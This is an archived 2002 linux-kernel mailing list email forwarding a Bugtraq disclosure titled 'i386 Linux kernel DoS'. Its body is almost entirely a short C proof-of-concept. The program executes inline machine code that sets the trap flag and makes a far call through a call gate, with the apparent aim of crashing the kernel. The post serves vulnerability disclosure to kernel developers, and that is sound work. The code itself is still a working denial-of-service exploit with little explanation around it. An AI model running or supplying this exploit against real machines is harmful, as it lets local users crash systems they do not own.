Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S267029AbSKLXWV>; Tue, 12 Nov 2002 18:22:21 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S267031AbSKLXWV>; Tue, 12 Nov 2002 18:22:21 -0500
Received: from daytona.gci.com ([205.140.80.57]:47119 "EHLO daytona.gci.com")
	by vger.kernel.org with ESMTP id <S267029AbSKLXWR>;
	Tue, 12 Nov 2002 18:22:17 -0500
Message-ID: <BF9651D8732ED311A61D00105A9CA3150B45FB3C@berkeley.gci.com>
From: Leif Sawyer <lsawyer@gci.com>
To: linux-kernel@vger.kernel.org
Subject: FW: i386 Linux kernel DoS
Date: Tue, 12 Nov 2002 14:28:55 -0900
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2656.59)
Content-Type: text/plain;
	charset="iso-8859-1"
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

This was posted on bugtraq today...


-----Original Message-----
From: Christophe Devine
Sent: Monday, November 11, 2002 11:26 AM
To: bugtraq@securityfocus.com
Subject: i386 Linux kernel DoS

/* USE AT YOUR OWN RISK ! */

int main( void )
{
    char dos[] = "\x9C"                           /* pushfd       */
                 "\x58"                           /* pop eax      */
                 "\x0D\x00\x01\x00\x00"           /* or eax,100h  */
                 "\x50"                           /* push eax     */
                 "\x9D"                           /* popfd        */
                 "\x9A\x00\x00\x00\x00\x07\x00";  /* call 07h:00h */

    void (* f)( void );

    f = (void *) dos; (* f)();

    return 1;
}
